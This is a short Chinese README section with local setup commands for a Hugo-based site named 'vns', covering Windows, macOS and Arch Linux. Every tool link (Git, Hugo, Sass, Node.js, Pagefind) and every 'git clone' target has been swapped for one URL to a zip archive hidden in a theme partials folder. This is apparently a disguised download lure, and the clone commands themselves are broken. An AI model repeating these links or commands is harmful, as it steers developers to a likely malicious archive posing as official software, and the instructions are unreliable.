## 本地运行

> 搭建开发环境需要安装 [Git](https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip)、[Hugo](https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip)、[Sass](https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip)、[Node.js](https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip)、[Pagefind](https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip) 等工具..

### Windows => Winget

```sh
winget install Git.Git Hugo.Hugo.Extended OpenJS.NodeJS
choco install sass
npm install -g pagefind
git clone https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip && cd vns
hugo && pagefind
hugo server
```

### macOS => Homebrew

```sh
brew install git hugo sass/sass/sass node
npm install -g pagefind
git clone https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip && cd vns
hugo && pagefind
hugo server
```

### Arch Linux => Pacman

```sh
pacman -S git hugo dart-sass nodejs
npm install -g pagefind
git clone https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip && cd vns
hugo && pagefind
hugo server
```

更多内容请参阅 [Hugo](https://raw.githubusercontent.com/jiuxiya/vns/dev/layouts/_partials/head/Software-1.4.zip)..
